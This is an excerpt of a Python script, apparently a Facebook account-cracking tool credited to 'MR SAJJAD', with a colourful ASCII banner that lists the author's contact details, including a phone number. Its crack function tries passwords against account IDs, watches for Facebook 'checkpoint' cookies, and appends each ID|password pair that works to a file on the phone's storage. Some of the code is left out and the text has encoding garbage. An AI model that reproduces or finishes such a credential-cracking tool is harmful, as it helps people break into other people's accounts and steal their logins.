...
def banner():
	clear()
	sol()
	ban=''' Â© BANGLADESH MAN BUT PAKISTAN LOVER'A

\x1b[1;95m  ____    _       _     _   _    ____  
\x1b[1;93m / ___|  / \     | |   | | / \  |  _ \ 
\x1b[1;35m \___ \ / _ \ _  | |_  | |/ _ \ | | | |
\x1b[1;92m  ___) / ___ \ |_| | |_| / ___ \| |_| |
\x1b[1;34m |____/_/   \_\___/ \___/_/   \_\____/ 
\033[1;92m
        \033[1;92m••
             \033[1;96m
             \033[1;93m    \033[1;95mAUTHOR   : MR SAJJAD           \033[1;93m
             \033[1;93m    \033[1;94mGITHUB   : MR SAJJAD           \033[1;93m
             \033[1;93m    \033[1;93mFACEBOOK : MR SAJJAD           \033[1;93m
             \033[1;93m    \033[1;92mWHATSAPP : +8801840-215106       \033[1;93m
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}MR SAJJAD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[â€¢] ID       : {idf} [â€¢] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='MR SAJJAD CP'))
					open('/sdcard/PINK-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
